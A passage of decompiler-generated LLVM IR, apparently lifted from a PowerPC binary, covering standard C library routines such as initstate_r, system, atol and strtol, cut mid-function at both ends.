  store i32 %v1_100064b4, i32* %ctr.global-to-local, align 4
  %v2_100064b4 = icmp eq i32 %v1_100064b4, 0
  br i1 %v2_100064b4, label %dec_label_pc_100064b4.dec_label_pc_100064b8_crit_edge, label %dec_label_pc_100064b0.dec_label_pc_10006490_crit_edge

dec_label_pc_100064b0.dec_label_pc_10006490_crit_edge: ; preds = %dec_label_pc_100064b0
  %v1_10006490.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10006490

dec_label_pc_100064b4.dec_label_pc_100064b8_crit_edge: ; preds = %dec_label_pc_100064b0
  %v0_100064b8.pre = load i32, i32* @r30, align 4
  %v0_100064bc.pre = load i32, i32* %r11.global-to-local, align 4
  %v0_100064c0.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_100064b8

dec_label_pc_100064b8:                            ; preds = %dec_label_pc_100064b4.preheader.thread, %dec_label_pc_100064b4.dec_label_pc_100064b8_crit_edge, %dec_label_pc_100064b4.preheader
  %v0_100064c0 = phi i32 [ %v0_100064c0.pre, %dec_label_pc_100064b4.dec_label_pc_100064b8_crit_edge ], [ %v0_10006478, %dec_label_pc_100064b4.preheader ], [ %v0_10006478, %dec_label_pc_100064b4.preheader.thread ]
  %v0_100064bc = phi i32 [ %v0_100064bc.pre, %dec_label_pc_100064b4.dec_label_pc_100064b8_crit_edge ], [ %v3_10006460, %dec_label_pc_100064b4.preheader ], [ %v3_10006460, %dec_label_pc_100064b4.preheader.thread ]
  %v1_100064c0 = phi i32 [ %v0_100064b8.pre, %dec_label_pc_100064b4.dec_label_pc_100064b8_crit_edge ], [ %v0_10006460, %dec_label_pc_100064b4.preheader ], [ %v0_10006460, %dec_label_pc_100064b4.preheader.thread ]
  %v1_100064b8 = add i32 %v1_100064c0, 20
  %v2_100064b8 = inttoptr i32 %v1_100064b8 to i32*
  %v3_100064b8 = load i32, i32* %v2_100064b8, align 4
  store i32 %v3_100064b8, i32* %r0.global-to-local, align 4
  %v1_100064bc = mul i32 %v0_100064bc, 10
  store i32 %v1_100064bc, i32* %r31.global-to-local, align 4
  %v2_100064c0 = add i32 %v1_100064c0, 4
  %v3_100064c0 = inttoptr i32 %v2_100064c0 to i32*
  store i32 %v0_100064c0, i32* %v3_100064c0, align 4
  %v0_100064c4 = load i32, i32* %r0.global-to-local, align 4
  %v1_100064c4 = mul i32 %v0_100064c4, 4
  %v0_100064c8 = load i32, i32* %r10.global-to-local, align 4
  %v2_100064c8 = add i32 %v0_100064c8, %v1_100064c4
  store i32 %v2_100064c8, i32* %r0.global-to-local, align 4
  %v1_100064cc = load i32, i32* @r30, align 4
  %v2_100064cc = inttoptr i32 %v1_100064cc to i32*
  store i32 %v2_100064c8, i32* %v2_100064cc, align 4
  %v2_100064e0 = ptrtoint i32* %stack_var_-24 to i32
  %v0_100064d821 = load i32, i32* %r31.global-to-local, align 4
  %v1_100064d822 = add i32 %v0_100064d821, -1
  store i32 %v1_100064d822, i32* @r31, align 4
  %tmp2025 = icmp sgt i32 %v1_100064d822, -1
  br i1 %tmp2025, label %dec_label_pc_100064d4, label %dec_label_pc_100064e8

dec_label_pc_100064d4:                            ; preds = %dec_label_pc_100064b8, %dec_label_pc_100064d4
  %v0_100064dc26 = load i32, i32* @r30, align 4
  %v2_100064d4 = inttoptr i32 %v0_100064dc26 to i32*
  %v3_100064d4 = call i32 @__GI_random_r(i32* %v2_100064d4, i32 %v2_100064e0)
  %v0_100064d8 = load i32, i32* @r31, align 4
  %v1_100064d8 = add i32 %v0_100064d8, -1
  store i32 %v1_100064d8, i32* @r31, align 4
  %tmp20 = icmp sgt i32 %v1_100064d8, -1
  br i1 %tmp20, label %dec_label_pc_100064d4, label %dec_label_pc_100064e8

dec_label_pc_100064e8:                            ; preds = %dec_label_pc_100064b8, %dec_label_pc_100064d4, %dec_label_pc_10006454
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_100064ec

dec_label_pc_100064ec:                            ; preds = %entry, %dec_label_pc_100064e8
  %v0_100064ec = phi i32 [ -1, %entry ], [ 0, %dec_label_pc_100064e8 ]
  store i32 %v0_10006420, i32* %r0.global-to-local, align 4
  ret i32 %v0_100064ec

; uselistorder directives
  uselistorder i32 %v1_100064b4, { 1, 0 }
  uselistorder i32 %v2_100064b0, { 1, 0 }
  uselistorder i32 %v2_100064a4, { 1, 0, 2, 3 }
  uselistorder i32 %v2_10006490, { 1, 0 }
  uselistorder i32 %v0_10006478, { 1, 2, 0 }
  uselistorder i32 %v3_10006460, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* %r10.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %ctr.global-to-local, { 2, 1, 0, 4, 3 }
  uselistorder label %dec_label_pc_100064ec, { 1, 0 }
  uselistorder label %dec_label_pc_100064e8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100064d4, { 1, 0 }
  uselistorder label %dec_label_pc_100064b8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_100064b0, { 1, 0 }
  uselistorder label %dec_label_pc_10006490, { 1, 0 }
  uselistorder label %dec_label_pc_10006454, { 1, 0 }
}

define i32 @__GI_initstate_r(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v2_10006504 = icmp ugt i32 %arg2, 127
  %v0_1000650c = load i32, i32* @lr, align 4
  store i32 %v0_1000650c, i32* %r0.global-to-local, align 4
  store i32 268500992, i32* %r9.global-to-local, align 4
  %v1_10006518 = sub i32 255, %arg2
  %v2_10006518 = sub i32 -1, %arg2
  %not.v5_10006518 = icmp ugt i32 %v1_10006518, %v2_10006518
  %v6_1000651c = sext i1 %not.v5_10006518 to i32
  store i32 %tmp, i32* %r27.global-to-local, align 4
  %v1_10006524 = add i32 %tmp, 4
  store i32 %v1_10006524, i32* %r29.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000c8d4.404 to i32), i32* %r11.global-to-local, align 4
  store i32 %arg3, i32* %r30.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  %v1_1000653c = sub nsw i32 3, %v6_1000651c
  store i32 %v1_1000653c, i32* @r31, align 4
  br i1 %v2_10006504, label %dec_label_pc_10006564, label %dec_label_pc_10006544

dec_label_pc_10006544:                            ; preds = %entry
  %v2_10006530 = icmp ugt i32 %arg2, 31
  %v1_10006544 = sub i32 63, %arg2
  %not.v5_10006544 = icmp ugt i32 %v1_10006544, %v2_10006518
  %v6_10006548 = sext i1 %not.v5_10006544 to i32
  %v1_10006550 = sub nsw i32 1, %v6_10006548
  store i32 %v1_10006550, i32* @r31, align 4
  br i1 %v2_10006530, label %dec_label_pc_10006564, label %dec_label_pc_10006558

dec_label_pc_10006558:                            ; preds = %dec_label_pc_10006544
  store i32 22, i32* %r28.global-to-local, align 4
  store i32 0, i32* @r31, align 4
  %tmp5 = icmp ult i32 %arg2, 8
  br i1 %tmp5, label %dec_label_pc_100065c4, label %dec_label_pc_10006564

dec_label_pc_10006564:                            ; preds = %dec_label_pc_10006558, %dec_label_pc_10006544, %entry
  %v0_10006564 = phi i32 [ 0, %dec_label_pc_10006558 ], [ %v1_10006550, %dec_label_pc_10006544 ], [ %v1_1000653c, %entry ]
  %v1_10006564 = mul nsw i32 %v0_10006564, 4
  store i32 %v1_10006564, i32* %r0.global-to-local, align 4
  %v2_10006568 = add i32 %arg3, 12
  %v3_10006568 = inttoptr i32 %v2_10006568 to i32*
  store i32 %v0_10006564, i32* %v3_10006568, align 4
  %v0_1000656c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000656c = load i32, i32* %r11.global-to-local, align 4
  %v2_1000656c = add i32 %v1_1000656c, %v0_1000656c
  store i32 %v2_1000656c, i32* %r9.global-to-local, align 4
  %v3_10006570 = inttoptr i32 %v2_1000656c to i32*
  %v4_10006570 = load i32, i32* %v3_10006570, align 4
  store i32 %v4_10006570, i32* %r0.global-to-local, align 4
  %v1_10006574 = add i32 %v2_1000656c, 20
  %v2_10006574 = inttoptr i32 %v1_10006574 to i32*
  %v3_10006574 = load i32, i32* %v2_10006574, align 4
  store i32 %v3_10006574, i32* %r9.global-to-local, align 4
  %v1_10006578 = load i32, i32* %r30.global-to-local, align 4
  %v2_10006578 = add i32 %v1_10006578, 20
  %v3_10006578 = inttoptr i32 %v2_10006578 to i32*
  store i32 %v4_10006570, i32* %v3_10006578, align 4
  %v0_1000657c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000657c = mul i32 %v0_1000657c, 4
  store i32 %v1_1000657c, i32* %r0.global-to-local, align 4
  %v0_10006580 = load i32, i32* %r29.global-to-local, align 4
  %v1_10006580 = load i32, i32* %r30.global-to-local, align 4
  %v2_10006580 = add i32 %v1_10006580, 8
  %v3_10006580 = inttoptr i32 %v2_10006580 to i32*
  store i32 %v0_10006580, i32* %v3_10006580, align 4
  %v0_10006584 = load i32, i32* %r29.global-to-local, align 4
  %v1_10006584 = load i32, i32* %r0.global-to-local, align 4
  %v2_10006584 = add i32 %v1_10006584, %v0_10006584
  store i32 %v2_10006584, i32* %r0.global-to-local, align 4
  %v0_10006588 = load i32, i32* %r9.global-to-local, align 4
  %v1_10006588 = load i32, i32* %r30.global-to-local, align 4
  %v2_10006588 = add i32 %v1_10006588, 16
  %v3_10006588 = inttoptr i32 %v2_10006588 to i32*
  store i32 %v0_10006588, i32* %v3_10006588, align 4
  %v0_1000658c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000658c = load i32, i32* %r30.global-to-local, align 4
  %v2_1000658c = add i32 %v1_1000658c, 24
  %v3_1000658c = inttoptr i32 %v2_1000658c to i32*
  store i32 %v0_1000658c, i32* %v3_1000658c, align 4
  store i32 268461460, i32* @lr, align 4
  %v0_10006590 = call i32 @srandom_r()
  %v0_10006594 = load i32, i32* @r31, align 4
  %v3_10006594 = icmp eq i32 %v0_10006594, 0
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_100065a0 = load i32, i32* %r27.global-to-local, align 4
  %v2_100065a0 = inttoptr i32 %v1_100065a0 to i32*
  store i32 0, i32* %v2_100065a0, align 4
  br i1 %v3_10006594, label %dec_label_pc_100065d8, label %dec_label_pc_100065a8

dec_label_pc_100065a8:                            ; preds = %dec_label_pc_10006564
  %v0_100065a8 = load i32, i32* @r30, align 4
  %v1_100065a8 = add i32 %v0_100065a8, 4
  %v2_100065a8 = inttoptr i32 %v1_100065a8 to i32*
  %v3_100065a8 = load i32, i32* %v2_100065a8, align 4
  %v0_100065ac = load i32, i32* %r29.global-to-local, align 4
  %v2_100065ac = sub i32 %v3_100065a8, %v0_100065ac
  %v4_100065b0 = sdiv i32 %v2_100065ac, 4
  %v1_100065b4 = mul i32 %v4_100065b0, 5
  %v1_100065b8 = load i32, i32* @r31, align 4
  %v2_100065b8 = add i32 %v1_100065b4, %v1_100065b8
  store i32 %v2_100065b8, i32* %r0.global-to-local, align 4
  %v1_100065bc = load i32, i32* %r27.global-to-local, align 4
  %v2_100065bc = inttoptr i32 %v1_100065bc to i32*
  store i32 %v2_100065b8, i32* %v2_100065bc, align 4
  br label %dec_label_pc_100065d8

dec_label_pc_100065c4:                            ; preds = %dec_label_pc_10006558
  %v0_100065c4 = call i32 @__errno_location()
  store i32 %v0_100065c4, i32* %r3.global-to-local, align 4
  %v0_100065c8 = load i32, i32* %r28.global-to-local, align 4
  %v2_100065c8 = inttoptr i32 %v0_100065c4 to i32*
  store i32 %v0_100065c8, i32* %v2_100065c8, align 4
  %v0_100065cc = call i32 @__errno_location()
  %v0_100065d0 = load i32, i32* %r28.global-to-local, align 4
  %v2_100065d0 = inttoptr i32 %v0_100065cc to i32*
  store i32 %v0_100065d0, i32* %v2_100065d0, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100065d8

dec_label_pc_100065d8:                            ; preds = %dec_label_pc_10006564, %dec_label_pc_100065a8, %dec_label_pc_100065c4
  store i32 %v0_1000650c, i32* %r0.global-to-local, align 4
  %v0_100065e8 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_100065e8

; uselistorder directives
  uselistorder i32 %v2_1000656c, { 1, 0, 2 }
  uselistorder i32 %v0_10006564, { 1, 0 }
  uselistorder i32 %v2_10006518, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32 ()* @srandom_r, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1000c8d4.404 to i32), { 2, 1, 0, 3 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder i32 %arg2, { 1, 2, 3, 0, 5, 4 }
  uselistorder label %dec_label_pc_100065d8, { 2, 1, 0 }
}

define i32 @__libc_system(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v0_100065f4 = load i32, i32* @r31, align 4
  %v3_100065fc = icmp eq i32 %arg1, 0
  store i1 false, i1* @cr0_so, align 1
  br i1 %v3_100065fc, label %dec_label_pc_1000672c, label %dec_label_pc_1000660c

dec_label_pc_1000660c:                            ; preds = %entry
  store i32 268461592, i32* @lr, align 4
  %v2_10006614 = call i32 @__bsd_signal(i32 3, i32 1)
  store i32 268461608, i32* @lr, align 4
  %v2_10006624 = call i32 @__bsd_signal(i32 2, i32 1)
  store i32 268461624, i32* @lr, align 4
  %v2_10006634 = call i32 @__bsd_signal(i32 17, i32 0)
  store i32 %v2_10006634, i32* @r3, align 4
  store i32 268461632, i32* @lr, align 4
  %v1_1000663c = call i32 @__vfork(i32 %v2_10006634)
  store i32 %v1_1000663c, i32* @r31, align 4
  %tmp10 = icmp sgt i32 %v1_1000663c, -1
  br i1 %tmp10, label %dec_label_pc_10006674, label %dec_label_pc_10006648

dec_label_pc_10006648:                            ; preds = %dec_label_pc_1000660c
  store i32 268461652, i32* @lr, align 4
  %v2_10006650 = call i32 @__bsd_signal(i32 3, i32 %v2_10006614)
  store i32 268461664, i32* @lr, align 4
  %v2_1000665c = call i32 @__bsd_signal(i32 2, i32 %v2_10006624)
  store i32 268461676, i32* @lr, align 4
  %v2_10006668 = call i32 @__bsd_signal(i32 17, i32 %v2_10006634)
  br label %dec_label_pc_1000672c

dec_label_pc_10006674:                            ; preds = %dec_label_pc_1000660c
  %v3_10006640 = icmp eq i32 %v1_1000663c, 0
  br i1 %v3_10006640, label %dec_label_pc_10006678, label %dec_label_pc_100066cc

dec_label_pc_10006678:                            ; preds = %dec_label_pc_10006674
  store i32 268461700, i32* @lr, align 4
  %v2_10006680 = call i32 @__bsd_signal(i32 3, i32 0)
  store i32 268461712, i32* @lr, align 4
  %v2_1000668c = call i32 @__bsd_signal(i32 2, i32 0)
  store i32 268461724, i32* @lr, align 4
  %v2_10006698 = call i32 @__bsd_signal(i32 17, i32 0)
  %v8_100066c0 = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_1000c8fc.406 to i32), i32 ptrtoint ([3 x i8]* @global_var_1000c904.407 to i32), i32 ptrtoint ([3 x i8]* @global_var_1000c908.408 to i32), i32 %arg1, i32 0)
  %v1_100066c8 = call i32 @__GI__exit(i32 127)
  br label %dec_label_pc_100066cc

dec_label_pc_100066cc:                            ; preds = %dec_label_pc_10006674, %dec_label_pc_10006678
  store i32 268461784, i32* @lr, align 4
  %v2_100066d4 = call i32 @__bsd_signal(i32 3, i32 1)
  store i32 268461796, i32* @lr, align 4
  %v2_100066e0 = call i32 @__bsd_signal(i32 2, i32 1)
  %v0_100066e4 = load i32, i32* @r31, align 4
  store i32 268461816, i32* @lr, align 4
  %v4_100066f4 = call i32 @wait4(i32 %v0_100066e4)
  %v3_100066f8 = icmp eq i32 %v4_100066f4, -1
  br i1 %v3_100066f8, label %dec_label_pc_10006700, label %dec_label_pc_10006704

dec_label_pc_10006700:                            ; preds = %dec_label_pc_100066cc
  store i32 -1, i32* %stack_var_-40, align 4
  br label %dec_label_pc_10006704

dec_label_pc_10006704:                            ; preds = %dec_label_pc_100066cc, %dec_label_pc_10006700
  store i32 268461840, i32* @lr, align 4
  %v2_1000670c = call i32 @__bsd_signal(i32 3, i32 %v2_10006614)
  store i32 268461852, i32* @lr, align 4
  %v2_10006718 = call i32 @__bsd_signal(i32 2, i32 %v2_10006624)
  store i32 268461864, i32* @lr, align 4
  %v2_10006724 = call i32 @__bsd_signal(i32 17, i32 %v2_10006634)
  %v3_10006728 = load i32, i32* %stack_var_-40, align 4
  br label %dec_label_pc_1000672c

dec_label_pc_1000672c:                            ; preds = %entry, %dec_label_pc_10006648, %dec_label_pc_10006704
  %v0_1000673c = phi i32 [ 1, %entry ], [ -1, %dec_label_pc_10006648 ], [ %v3_10006728, %dec_label_pc_10006704 ]
  store i32 %v0_100065f4, i32* @r31, align 4
  ret i32 %v0_1000673c

; uselistorder directives
  uselistorder i32 %v1_1000663c, { 1, 0, 2 }
  uselistorder i32 %v2_10006634, { 1, 0, 2, 3 }
  uselistorder i32 %v2_10006624, { 1, 0 }
  uselistorder i32 %v2_10006614, { 1, 0 }
  uselistorder i32 (i32, i32)* @__bsd_signal, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1000672c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10006704, { 1, 0 }
  uselistorder label %dec_label_pc_100066cc, { 1, 0 }
}

define i32 @atol(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 0, i32* @r4, align 4
  store i32 10, i32* @r5, align 4
  %v2_10006748 = call i32 @strtol(i32 0, i32 10)
  ret i32 %v2_10006748
}

define i32 @strtol(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 1, i32* @r6, align 4
  %v2_10006750 = call i32 @_stdlib_strto_l(i8* inttoptr (i32 1 to i8*))
  ret i32 %v2_10006750
}

define i32 @_stdlib_strto_l(i8* %arg1) local_unnamed_addr {
entry:
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_10006764 = load i32, i32* @r4, align 4
  store i32 %v0_10006764, i32* %r25.global-to-local, align 4
  %v0_1000676c = load i32, i32* @r5, align 4
  store i32 %v0_1000676c, i32* %r30.global-to-local, align 4
  %v0_10006770 = load i32, i32* @r6, align 4
  store i32 %v0_10006770, i32* %r26.global-to-local, align 4
  store i32 %tmp, i32* %r31.global-to-local, align 4
  %v3_10006778 = load i32, i32* @global_var_1001d808, align 4
  br label %dec_label_pc_10006784

dec_label_pc_10006780:                            ; preds = %dec_label_pc_10006784
  %v1_10006780 = add i32 %v0_100067b8, 1
  store i32 %v1_10006780, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10006784

dec_label_pc_10006784:                            ; preds = %entry, %dec_label_pc_10006780
  %v0_100067b8 = phi i32 [ %tmp, %entry ], [ %v1_10006780, %dec_label_pc_10006780 ]
  %v1_10006784 = inttoptr i32 %v0_100067b8 to i8*
  %v2_10006784 = load i8, i8* %v1_10006784, align 1
  %v3_10006784 = zext i8 %v2_10006784 to i32
  %v1_10006788 = mul nuw nsw i32 %v3_10006784, 2
  %v2_1000678c = add i32 %v1_10006788, %v3_10006778
  %v3_1000678c = inttoptr i32 %v2_1000678c to i16*
  %v4_1000678c = load i16, i16* %v3_1000678c, align 2
  %v1_10006790 = and i16 %v4_1000678c, 32
  %v3_10006790 = icmp eq i16 %v1_10006790, 0
  br i1 %v3_10006790, label %dec_label_pc_10006798, label %dec_label_pc_10006780

dec_label_pc_10006798:                            ; preds = %dec_label_pc_10006784
  %v3_10006798 = icmp eq i8 %v2_10006784, 43
  br i1 %v3_10006798, label %dec_label_pc_100067b8, label %dec_label_pc_100067a0

dec_label_pc_100067a0:                            ; preds = %dec_label_pc_10006798
  %v3_100067a0 = icmp eq i8 %v2_10006784, 45
  store i32 0, i32* %r28.global-to-local, align 4
  br i1 %v3_100067a0, label %dec_label_pc_100067b8, label %dec_label_pc_100067bc

dec_label_pc_100067b8:                            ; preds = %dec_label_pc_10006798, %dec_label_pc_100067a0
  %storemerge = phi i32 [ 1, %dec_label_pc_100067a0 ], [ 0, %dec_label_pc_10006798 ]
  store i32 %storemerge, i32* %r28.global-to-local, align 4
  %v1_100067b8 = add i32 %v0_100067b8, 1
  store i32 %v1_100067b8, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_100067bc

dec_label_pc_100067bc:                            ; preds = %dec_label_pc_100067a0, %dec_label_pc_100067b8
  %v1_100067bc = call i32 @__asm_rlwinm.(i32 %v0_1000676c, i32 0, i32 28, i32 26)
  %v4_100067bc = icmp eq i32 %v1_100067bc, 0
  br i1 %v4_100067bc, label %dec_label_pc_100067c8, label %dec_label_pc_100067bc.dec_label_pc_10006804_crit_edge

dec_label_pc_100067bc.dec_label_pc_10006804_crit_edge: ; preds = %dec_label_pc_100067bc
  %v0_10006804.pre = load i32, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10006804

dec_label_pc_100067c8:                            ; preds = %dec_label_pc_100067bc
  %v0_100067c8 = load i32, i32* %r31.global-to-local, align 4
  %v1_100067c8 = inttoptr i32 %v0_100067c8 to i8*
  %v2_100067c8 = load i8, i8* %v1_100067c8, align 1
  %v0_100067cc = load i32, i32* %r30.global-to-local, align 4
  %v1_100067cc = add i32 %v0_100067cc, 10
  store i32 %v1_100067cc, i32* %r30.global-to-local, align 4
  %v3_100067d0 = icmp eq i8 %v2_100067c8, 48
  br i1 %v3_100067d0, label %dec_label_pc_100067d8, label %dec_label_pc_100067f8

dec_label_pc_100067d8:                            ; preds = %dec_label_pc_100067c8
  %v1_100067d8 = add i32 %v0_100067c8, 1
  %v2_100067d8 = inttoptr i32 %v1_100067d8 to i8*
  %v3_100067d8 = load i8, i8* %v2_100067d8, align 1
  %v4_100067d8 = zext i8 %v3_100067d8 to i32
  store i32 %v1_100067d8, i32* %r31.global-to-local, align 4
  %v1_100067dc = add i32 %v0_100067cc, 8
  store i32 %v1_100067dc, i32* %r30.global-to-local, align 4
  %v1_100067e0 = or i32 %v4_100067d8, 32
  %v3_100067e8 = icmp eq i32 %v1_100067e0, 120
  br i1 %v3_100067e8, label %dec_label_pc_100067f0, label %dec_label_pc_100067f8

dec_label_pc_100067f0:                            ; preds = %dec_label_pc_100067d8
  %v1_100067f0 = mul i32 %v1_100067dc, 2
  store i32 %v1_100067f0, i32* %r30.global-to-local, align 4
  %v1_100067f4 = add i32 %v0_100067c8, 2
  store i32 %v1_100067f4, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_100067f8

dec_label_pc_100067f8:                            ; preds = %dec_label_pc_100067d8, %dec_label_pc_100067c8, %dec_label_pc_100067f0
  %v0_100068ac15 = phi i32 [ %v1_100067d8, %dec_label_pc_100067f0 ], [ %tmp, %dec_label_pc_100067c8 ], [ %v1_100067d8, %dec_label_pc_100067d8 ]
  %v0_100067f8 = phi i32 [ %v1_100067f0, %dec_label_pc_100067f0 ], [ %v1_100067cc, %dec_label_pc_100067c8 ], [ %v1_100067dc, %dec_label_pc_100067d8 ]
  %tmp22 = icmp slt i32 %v0_100067f8, 17
  br i1 %tmp22, label %dec_label_pc_10006804, label %dec_label_pc_10006800

dec_label_pc_10006800:                            ; preds = %dec_label_pc_100067f8
  store i32 16, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10006804

dec_label_pc_10006804:                            ; preds = %dec_label_pc_100067bc.dec_label_pc_10006804_crit_edge, %dec_label_pc_100067f8, %dec_label_pc_10006800
  %v0_100068ac14 = phi i32 [ %tmp, %dec_label_pc_100067bc.dec_label_pc_10006804_crit_edge ], [ %v0_100068ac15, %dec_label_pc_100067f8 ], [ %v0_100068ac15, %dec_label_pc_10006800 ]
  %v1_10006818 = phi i32 [ %v0_10006804.pre, %dec_label_pc_100067bc.dec_label_pc_10006804_crit_edge ], [ %v0_100067f8, %dec_label_pc_100067f8 ], [ 16, %dec_label_pc_10006800 ]
  %v1_10006804 = add i32 %v1_10006818, -2
  store i32 0, i32* %r8.global-to-local, align 4
  %v2_1000680c = icmp ugt i32 %v1_10006804, 34
  br i1 %v2_1000680c, label %dec_label_pc_100068a4, label %dec_label_pc_10006814

dec_label_pc_10006814:                            ; preds = %dec_label_pc_10006804
  %v2_10006818 = udiv i32 -1, %v1_10006818
  store i32 %v2_10006818, i32* %r29.global-to-local, align 4
  %v2_1000681c = mul i32 %v2_10006818, %v1_10006818
  %v1_10006820 = sub i32 -1, %v2_1000681c
  %v1_10006824 = urem i32 %v1_10006820, 256
  store i32 %v1_10006824, i32* %r27.global-to-local, align 4
  %v0_10006830.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10006830

dec_label_pc_1000682c:                            ; preds = %dec_label_pc_10006898, %dec_label_pc_10006880
  %v1_10006834.pre = phi i32 [ %v1_10006838, %dec_label_pc_10006898 ], [ %v1_10006834.pre.pre, %dec_label_pc_10006880 ]
  %v0_10006834.pre = phi i32 [ %v2_1000689c, %dec_label_pc_10006898 ], [ %v0_10006834.pre.pre, %dec_label_pc_10006880 ]
  %v0_1000682c = phi i32 [ %v1_1000683c, %dec_label_pc_10006898 ], [ %v0_1000682c.pre, %dec_label_pc_10006880 ]
  br label %dec_label_pc_10006830

dec_label_pc_10006830:                            ; preds = %dec_label_pc_10006814, %dec_label_pc_1000682c
  %v0_100068ac12 = phi i32 [ %v0_100068ac14, %dec_label_pc_10006814 ], [ %v0_1000682c, %dec_label_pc_1000682c ]
  %v0_1000683c = phi i32 [ %v0_10006830.pre, %dec_label_pc_10006814 ], [ %v0_1000682c, %dec_label_pc_1000682c ]
  %v1_10006838 = phi i32 [ %v2_10006818, %dec_label_pc_10006814 ], [ %v1_10006834.pre, %dec_label_pc_1000682c ]
  %v0_10006898 = phi i32 [ 0, %dec_label_pc_10006814 ], [ %v0_10006834.pre, %dec_label_pc_1000682c ]
  %v1_10006830 = inttoptr i32 %v0_1000683c to i8*
  %v2_10006830 = load i8, i8* %v1_10006830, align 1
  %v3_10006830 = zext i8 %v2_10006830 to i32
  %v3_10006834 = icmp ugt i32 %v0_10006898, %v1_10006838
  %v1_1000683c = add i32 %v0_1000683c, 1
  store i32 %v1_1000683c, i32* %r31.global-to-local, align 4
  %v1_10006840 = add nsw i32 %v3_10006830, -48
  %v1_10006844 = or i32 %v3_10006830, 32
  %v1_10006848 = urem i32 %v1_10006840, 256
  %tmp23 = icmp ult i32 %v1_10006848, 10
  br i1 %tmp23, label %dec_label_pc_10006868, label %dec_label_pc_10006858

dec_label_pc_10006858:                            ; preds = %dec_label_pc_10006830
  %tmp24 = icmp ult i32 %v1_10006844, 97
  br i1 %tmp24, label %dec_label_pc_10006868, label %dec_label_pc_10006864

dec_label_pc_10006864:                            ; preds = %dec_label_pc_10006858
  %v1_10006858 = add nsw i32 %v1_10006844, -87
  %v1_10006864 = urem i32 %v1_10006858, 256
  br label %dec_label_pc_10006868

dec_label_pc_10006868:                            ; preds = %dec_label_pc_10006858, %dec_label_pc_10006830, %dec_label_pc_10006864
  %v1_1000689c = phi i32 [ 40, %dec_label_pc_10006858 ], [ %v1_10006848, %dec_label_pc_10006830 ], [ %v1_10006864, %dec_label_pc_10006864 ]
  %v1_10006868 = load i32, i32* %r30.global-to-local, align 4
  %v2_10006868 = icmp slt i32 %v1_1000689c, %v1_10006868
  br i1 %v2_10006868, label %dec_label_pc_10006870, label %dec_label_pc_100068a4

dec_label_pc_10006870:                            ; preds = %dec_label_pc_10006868
  br i1 %v3_10006834, label %dec_label_pc_10006880, label %dec_label_pc_10006874

dec_label_pc_10006874:                            ; preds = %dec_label_pc_10006870
  %v1_10006874 = load i32, i32* %r27.global-to-local, align 4
  %v0_10006878.not = icmp ne i32 %v0_10006898, %v1_10006838
  %tmp25 = icmp ule i32 %v1_1000689c, %v1_10006874
  %or.cond = or i1 %tmp25, %v0_10006878.not
  br i1 %or.cond, label %dec_label_pc_10006898, label %dec_label_pc_10006880

dec_label_pc_10006880:                            ; preds = %dec_label_pc_10006874, %dec_label_pc_10006870
  %v0_10006880 = call i32 @__errno_location()
  %v0_10006884 = load i32, i32* %r28.global-to-local, align 4
  %v1_10006884 = load i32, i32* %r26.global-to-local, align 4
  %v2_10006884 = and i32 %v1_10006884, %v0_10006884
  store i32 %v2_10006884, i32* %r28.global-to-local, align 4
  store i32 -1, i32* %r8.global-to-local, align 4
  %v2_10006890 = inttoptr i32 %v0_10006880 to i32*
  store i32 34, i32* %v2_10006890, align 4
  %v0_1000682c.pre = load i32, i32* %r31.global-to-local, align 4
  %v0_10006834.pre.pre = load i32, i32* %r8.global-to-local, align 4
  %v1_10006834.pre.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000682c

dec_label_pc_10006898:                            ; preds = %dec_label_pc_10006874
  %v2_10006898 = mul i32 %v1_10006868, %v0_10006898
  %v2_1000689c = add i32 %v2_10006898, %v1_1000689c
  store i32 %v2_1000689c, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000682c

